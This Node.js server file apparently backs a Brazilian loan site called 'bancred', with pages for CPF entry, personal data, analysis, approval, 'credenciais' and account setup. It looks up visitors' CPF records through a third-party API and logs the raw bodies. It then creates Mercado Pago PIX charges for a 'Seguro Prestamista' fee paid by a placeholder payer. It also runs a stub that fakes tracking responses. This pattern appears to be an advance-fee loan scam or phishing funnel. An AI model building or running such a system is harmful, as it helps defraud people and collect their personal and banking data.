const http = require("http");
const https = require("https");
const fs = require("fs");
const path = require("path");
const { URL } = require("url");

const rootDir = __dirname;
const envFromFile = loadEnvFile(path.join(rootDir, ".env"));
for (const [key, value] of Object.entries(envFromFile)) {
  if (process.env[key] === undefined) {
    process.env[key] = value;
  }
}
const port = 3005;

const mimeTypes = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".ico": "image/x-icon",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".svg": "image/svg+xml",
  ".webp": "image/webp",
  ".woff": "font/woff",
  ".woff2": "font/woff2",
  ".ttf": "font/ttf",
  ".eot": "application/vnd.ms-fontobject",
  ".map": "application/json; charset=utf-8",
};

const distDir = path.join(rootDir, "dist");
const distIndex = path.join(distDir, "index.html");

const entryPoints = {
  inicio: "inicio.html",
  cpfHtml: "cpf.html",
  pessoaHtml: "pessoa.html",
  analise: "analise",
  aprovado: "aprovado",
  bancred: "bancred",
  configurandoConta: "configurando-conta",
  conta: "conta",
  cpf: "cpf",
  credenciais: "credenciais",
  endereco: "endereco",
  pessoa: "pessoa",
  simulacao: "simulacao",
};

const aliasPaths = {
  "/": "/inicio/",
  "/inicio": "/inicio/",
  "/analise": "/analise/",
  "/aprovado": "/aprovado/",
  "/bancred": "/bancred/",
  "/configurando-conta": "/configurando-conta/",
  "/conta": "/conta/",
  "/cpf": "/cpf/",
  "/credenciais": "/credenciais/",
  "/endereco": "/endereco/",
  "/pessoa": "/pessoa/",
  "/simulacao": "/simulacao/",
  "/inicio/cpf.html": "/cpf/",
  "/inicio/cpf.html/": "/cpf/",
  "/inicio/pessoa.html": "/pessoa/",
  "/inicio/pessoa.html/": "/pessoa/",
  "/cpf/pessoa.html": "/cpf/pessoa.html/",
  "/inicio.html": "/inicio/",
  "/cpf.html": "/cpf.html/",
  "/pessoa.html": "/pessoa.html/",
};

const baseMappings = [
  { prefix: "/cpf/pessoa.html/", folder: entryPoints.pessoa },
  { prefix: "/inicio/", folder: entryPoints.inicio },
  { prefix: "/cpf.html/", folder: entryPoints.cpfHtml },
  { prefix: "/pessoa.html/", folder: entryPoints.pessoaHtml },
  { prefix: "/analise/", folder: entryPoints.analise },
  { prefix: "/aprovado/", folder: entryPoints.aprovado },
  { prefix: "/bancred/", folder: entryPoints.bancred },
  { prefix: "/configurando-conta/", folder: entryPoints.configurandoConta },
  { prefix: "/conta/", folder: entryPoints.conta },
  { prefix: "/cpf/", folder: entryPoints.cpf },
  { prefix: "/credenciais/", folder: entryPoints.credenciais },
  { prefix: "/endereco/", folder: entryPoints.endereco },
  { prefix: "/pessoa/", folder: entryPoints.pessoa },
  { prefix: "/simulacao/", folder: entryPoints.simulacao },
  { prefix: "/inicio.html/", folder: entryPoints.inicio },
];

function send(res, status, body, contentType) {
  res.writeHead(status, {
    "Content-Type": contentType || "text/plain; charset=utf-8",
    "Cache-Control": "no-store",
  });
  res.end(body);
}

function resolveFilePath(requestPath) {
  const normalized = requestPath.replace(/^\/+/, "");
  if (!normalized) {
    return fs.existsSync(distIndex) ? distIndex : null;
  }
  const directPath = path.join(distDir, normalized);
  if (fs.existsSync(directPath) && fs.statSync(directPath).isFile()) {
    return directPath;
  }
  const indexPath = path.join(distDir, normalized, "index.html");
  if (fs.existsSync(indexPath) && fs.statSync(indexPath).isFile()) {
    return indexPath;
  }
  return fs.existsSync(distIndex) ? distIndex : null;
}

function loadEnvFile(filePath) {
  try {
    const content = fs.readFileSync(filePath, "utf8");
    const lines = content.split(/\r?\n/);
    const env = {};
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith("#")) {
        continue;
      }
      const idx = trimmed.indexOf("=");
      if (idx === -1) {
        continue;
      }
      const key = trimmed.slice(0, idx).trim();
      let value = trimmed.slice(idx + 1).trim();
      if ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'"))) {
        value = value.slice(1, -1);
      }
      env[key] = value;
    }
    return env;
  } catch (err) {
    return {};
  }
}

function getRapidApiKey() {
  return process.env["x-rapidapi-key"] || process.env.X_RAPIDAPI_KEY || process.env.RAPIDAPI_KEY;
}

function getRapidApiHost() {
  return process.env["x-rapidapi-host"] || process.env.X_RAPIDAPI_HOST || "api-cpf-gratis.p.rapidapi.com";
}

function getCepApiHost() {
  return process.env["x-rapidapi-cep-host"] || process.env.X_RAPIDAPI_CEP_HOST || "viacep.p.rapidapi.com";
}

function getMercadoPagoAccessToken() {
  return process.env.MERCADO_PAGO_ACCESS_TOKEN || process.env.MERCADOPAGO_ACCESS_TOKEN;
}

function getWebhookBaseUrl() {
  return process.env.WEBHOOK_BASE_URL || "";
}

function respondJson(res, status, data, extraHeaders) {
  const responseBody = JSON.stringify(data);
  res.writeHead(status, {
    "Content-Type": "application/json; charset=utf-8",
    "Content-Length": Buffer.byteLength(responseBody),
    "Cache-Control": "no-store",
    "Access-Control-Allow-Origin": "*",
    ...(extraHeaders || {}),
  });
  res.end(responseBody);
}

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const pathname = decodeURIComponent(url.pathname);

  if (req.method === "OPTIONS") {
    res.writeHead(204, {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
      "Cache-Control": "no-store",
    });
    res.end();
    return;
  }

  if (req.method === "POST" && (pathname === "/consulta/cpf.php" || pathname === "/consulta/cpf")) {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk;
      if (body.length > 1e6) {
        req.destroy();
      }
    });
    req.on("end", () => {
      console.log(`[CPF] Requisição recebida em ${new Date().toISOString()}`);
      console.log(`[CPF] Body bruto: ${body}`);
      let cpf = "";
      try {
        const parsed = body ? JSON.parse(body) : {};
        cpf = String(parsed.cpf || "").trim();
      } catch (err) {
        console.log(`[CPF] Erro ao parsear JSON: ${err.message}`);
        respondJson(res, 400, { success: false, message: "Payload inválido" });
        return;
      }

      if (!cpf) {
        console.log("[CPF] CPF vazio ou ausente");
        respondJson(res, 400, { success: false, message: "CPF obrigatório" });
        return;
      }

      const apiKey = getRapidApiKey();
      const apiHost = getRapidApiHost();
      const maskedKey = apiKey ? `${apiKey.slice(0, 6)}...${apiKey.slice(-4)}` : "N/A";
      console.log(`[CPF] CPF recebido: ${cpf}`);
      console.log(`[CPF] Host RapidAPI: ${apiHost}`);
      console.log(`[CPF] Key RapidAPI (mascarada): ${maskedKey}`);

      if (!apiKey) {
        console.log("[CPF] Chave da RapidAPI não configurada");
        respondJson(res, 500, { success: false, message: "Chave da RapidAPI não configurada" });
        return;
      }

      const requestOptions = {
        hostname: apiHost,
        path: `/?cpf=${encodeURIComponent(cpf)}`,
        method: "GET",
        headers: {
          "x-rapidapi-host": apiHost,
          "x-rapidapi-key": apiKey,
        },
      };

      const apiReq = https.request(requestOptions, (apiRes) => {
        let response = "";
        apiRes.on("data", (chunk) => {
          response += chunk;
        });
        apiRes.on("end", () => {
          console.log(`[CPF] Status RapidAPI: ${apiRes.statusCode}`);
          console.log(`[CPF] Resposta RapidAPI: ${response}`);
          try {
            const parsed = response ? JSON.parse(response) : {};
            if (parsed.code !== 200 || !parsed.data) {
              console.log("[CPF] Resposta inválida da RapidAPI");
              respondJson(res, 200, { success: false, message: "Resposta inválida da API" });
              return;
            }
            const data = parsed.data || {};
            const nomeMae = "****************";
            const payload = {
              success: true,
              data: {
                cpf: data.cpf || cpf,
                nome: data.nome || "",
                genero: data.genero || "",
                data_nascimento: data.data_nascimento || "",
                nome_mae: nomeMae,
                CPF: data.cpf || cpf,
                NOME: data.nome || "",
                SEXO: data.genero || "",
                NASC: data.data_nascimento || "",
                NOME_MAE: nomeMae,
              },
            };
            respondJson(res, 200, payload);
          } catch (err) {
            console.log(`[CPF] Erro ao processar resposta: ${err.message}`);
            respondJson(res, 200, { success: false, message: "Erro ao processar resposta da API" });
          }
        });
      });

      apiReq.on("error", (err) => {
        console.log(`[CPF] Erro na chamada RapidAPI: ${err.message}`);
        respondJson(res, 200, { success: false, message: "Erro ao consultar API" });
      });
      apiReq.end();
    });
    return;
  }

  if (req.method === "GET" && pathname.startsWith("/consulta/cep")) {
    const cepFromPath = pathname.replace("/consulta/cep", "").replace("/", "");
    const cep = (url.searchParams.get("cep") || cepFromPath || "").trim();
    const cepSanitizado = cep.replace(/\D/g, "");

    if (cepSanitizado.length !== 8) {
      respondJson(res, 400, { success: false, message: "CEP inválido" });
      return;
    }

    const apiKey = getRapidApiKey();
    const apiHost = getCepApiHost();

    if (!apiKey) {
      respondJson(res, 500, { success: false, message: "Chave da RapidAPI não configurada" });
      return;
    }

    const requestOptions = {
      hostname: apiHost,
      path: `/${cepSanitizado}/json`,
      method: "GET",
      headers: {
        "x-rapidapi-host": apiHost,
        "x-rapidapi-key": apiKey,
      },
    };

    const apiReq = https.request(requestOptions, (apiRes) => {
      let response = "";
      apiRes.on("data", (chunk) => {
        response += chunk;
      });
      apiRes.on("end", () => {
        try {
          const parsed = response ? JSON.parse(response) : {};
          if (!parsed || parsed.erro) {
            respondJson(res, 200, { success: false, message: "CEP não encontrado" });
            return;
          }
          respondJson(res, 200, { success: true, data: parsed });
        } catch (err) {
          respondJson(res, 200, { success: false, message: "Erro ao processar resposta da API" });
        }
      });
    });

    apiReq.on("error", () => {
      respondJson(res, 200, { success: false, message: "Erro ao consultar API" });
    });
    apiReq.end();
    return;
  }

  if (req.method === "GET" && pathname === "/consulta/bancos") {
    const requestOptions = {
      hostname: "brasilapi.com.br",
      path: "/api/banks/v1",
      method: "GET",
    };

    const apiReq = https.request(requestOptions, (apiRes) => {
      let response = "";
      apiRes.on("data", (chunk) => {
        response += chunk;
      });
      apiRes.on("end", () => {
        try {
          const parsed = response ? JSON.parse(response) : [];
          if (!Array.isArray(parsed)) {
            respondJson(res, 200, { success: false, message: "Lista de bancos indisponível" });
            return;
          }
          respondJson(res, 200, { success: true, data: parsed });
        } catch (err) {
          respondJson(res, 200, { success: false, message: "Erro ao processar resposta da API" });
        }
      });
    });

    apiReq.on("error", () => {
      respondJson(res, 200, { success: false, message: "Erro ao consultar API" });
    });
    apiReq.end();
    return;
  }

  if (req.method === "POST" && pathname === "/api/pix/mercadopago") {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk;
      if (body.length > 2e6) {
        req.destroy();
      }
    });
    req.on("end", () => {
      console.log(`[PIX] Requisição recebida em ${new Date().toISOString()}`);
      console.log(`[PIX] Body bruto: ${body}`);
      let payload = {};
      try {
        payload = body ? JSON.parse(body) : {};
      } catch (err) {
        console.log(`[PIX] Erro ao parsear JSON: ${err.message}`);
        respondJson(res, 400, { success: false, message: "Payload inválido" });
        return;
      }

      const valor = Number(payload.valor || 0);
      const descricao = String(payload.descricao || "Seguro Prestamista").trim();
      const accessToken = getMercadoPagoAccessToken();
      const webhookBase = getWebhookBaseUrl();
      const maskedToken = accessToken ? `${accessToken.slice(0, 6)}...${accessToken.slice(-4)}` : "N/A";
      const notificationUrl = webhookBase ? `${webhookBase.replace(/\/$/, "")}/api/pix/mercadopago/webhook` : "";

      console.log(`[PIX] Valor: ${valor}`);
      console.log(`[PIX] Descrição: ${descricao}`);
      console.log(`[PIX] Token (mascarado): ${maskedToken}`);
      console.log(`[PIX] Webhook: ${notificationUrl || "não configurado"}`);

      if (!accessToken) {
        respondJson(res, 500, { success: false, message: "Credenciais do Mercado Pago não configuradas" });
        return;
      }

      if (!valor || Number.isNaN(valor) || valor <= 0) {
        respondJson(res, 400, { success: false, message: "Valor inválido" });
        return;
      }

      const mpPayload = {
        transaction_amount: valor,
        description: descricao,
        payment_method_id: "pix",
        payer: {
          email: "pagador@bancred.com",
        },
      };

      if (notificationUrl) {
        mpPayload.notification_url = notificationUrl;
      }

      const requestOptions = {
        hostname: "api.mercadopago.com",
        path: "/v1/payments",
        method: "POST",
        headers: {
          Authorization: `Bearer ${accessToken}`,
          "Content-Type": "application/json",
        },
      };

      const apiReq = https.request(requestOptions, (apiRes) => {
        let response = "";
        apiRes.on("data", (chunk) => {
          response += chunk;
        });
        apiRes.on("end", () => {
          const status = apiRes.statusCode || 200;
          console.log(`[PIX] Mercado Pago status: ${status}`);
          console.log(`[PIX] Mercado Pago body: ${response}`);
          try {
            const parsed = response ? JSON.parse(response) : {};
            respondJson(res, status, { success: status < 400, data: parsed });
          } catch (err) {
            respondJson(res, 500, { success: false, message: "Erro ao processar resposta do Mercado Pago" });
          }
        });
      });

      apiReq.on("error", (err) => {
        console.log(`[PIX] Erro Mercado Pago: ${err.message}`);
        respondJson(res, 500, { success: false, message: "Erro ao gerar PIX" });
      });

      apiReq.write(JSON.stringify(mpPayload));
      apiReq.end();
    });
    return;
  }

  if (req.method === "GET" && pathname.startsWith("/api/pix/mercadopago/")) {
    const id = pathname.replace("/api/pix/mercadopago/", "").trim();
    const accessToken = getMercadoPagoAccessToken();
    const maskedToken = accessToken ? `${accessToken.slice(0, 6)}...${accessToken.slice(-4)}` : "N/A";
    console.log(`[PIX] Consulta status em ${new Date().toISOString()}`);
    console.log(`[PIX] ID: ${id}`);
    console.log(`[PIX] Token (mascarado): ${maskedToken}`);

    if (!accessToken) {
      respondJson(res, 500, { success: false, message: "Credenciais do Mercado Pago não configuradas" });
      return;
    }

    if (!id) {
      respondJson(res, 400, { success: false, message: "ID inválido" });
      return;
    }

    const requestOptions = {
      hostname: "api.mercadopago.com",
      path: `/v1/payments/${encodeURIComponent(id)}`,
      method: "GET",
      headers: {
        Authorization: `Bearer ${accessToken}`,
      },
    };

    const apiReq = https.request(requestOptions, (apiRes) => {
      let response = "";
      apiRes.on("data", (chunk) => {
        response += chunk;
      });
      apiRes.on("end", () => {
        const status = apiRes.statusCode || 200;
        console.log(`[PIX] Mercado Pago status consulta: ${status}`);
        console.log(`[PIX] Mercado Pago body consulta: ${response}`);
        try {
          const parsed = response ? JSON.parse(response) : {};
          respondJson(res, status, { success: status < 400, data: parsed });
        } catch (err) {
          respondJson(res, 500, { success: false, message: "Erro ao processar resposta do Mercado Pago" });
        }
      });
    });

    apiReq.on("error", (err) => {
      console.log(`[PIX] Erro consulta Mercado Pago: ${err.message}`);
      respondJson(res, 500, { success: false, message: "Erro ao consultar PIX" });
    });
    apiReq.end();
    return;
  }

  if (req.method === "POST" && pathname === "/api/pix/mercadopago/webhook") {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk;
      if (body.length > 2e6) {
        req.destroy();
      }
    });
    req.on("end", () => {
      console.log(`[PIX] Webhook recebido em ${new Date().toISOString()}`);
      console.log(`[PIX] Webhook body: ${body}`);
      respondJson(res, 200, { success: true });
    });
    return;
  }

  if (req.method !== "GET" && req.method !== "HEAD") {
    send(res, 405, "Método não permitido");
    return;
  }

  if (aliasPaths[pathname]) {
    const location = aliasPaths[pathname] + (url.search || "");
    res.writeHead(302, { Location: location });
    res.end();
    return;
  }

  const filePath = resolveFilePath(pathname);
  if (!filePath) {
    send(res, 404, "Não encontrado");
    return;
  }

  fs.stat(filePath, (err, stats) => {
    if (err || !stats.isFile()) {
      send(res, 404, "Não encontrado");
      return;
    }

    const ext = path.extname(filePath).toLowerCase();
    const contentType = mimeTypes[ext] || "application/octet-stream";

    res.writeHead(200, {
      "Content-Type": contentType,
      "Cache-Control": "no-store",
    });

    if (req.method === "HEAD") {
      res.end();
      return;
    }

    const stream = fs.createReadStream(filePath);
    stream.on("error", () => send(res, 500, "Erro ao ler arquivo"));
    stream.pipe(res);
  });
});

const trackingServer = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const pathname = decodeURIComponent(url.pathname);

  if (pathname === "/tracking/v1/events") {
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type, Accept, Origin, X-Requested-With",
      "Cache-Control": "no-store",
    };

    if (req.method === "OPTIONS") {
      res.writeHead(204, corsHeaders);
      res.end();
      return;
    }

    if (req.method !== "POST") {
      res.writeHead(405, corsHeaders);
      res.end();
      return;
    }

    const responseBody = JSON.stringify({
      ok: true,
      _id: "local-stub",
      data: { _id: "local-stub" },
      event: { _id: "local-stub" },
      events: [{ _id: "local-stub" }],
    });
    res.writeHead(200, {
      ...corsHeaders,
      "Content-Type": "application/json; charset=utf-8",
      "Content-Length": Buffer.byteLength(responseBody),
    });
    res.end(responseBody);
    return;
  }

  send(res, 404, "Não encontrado");
});

server.listen(port, () => {
  console.log(`Servidor rodando em http://localhost:${port}/`);
});

trackingServer.listen(3006, () => {
  console.log(`Stub de tracking em http://localhost:3006/`);
});
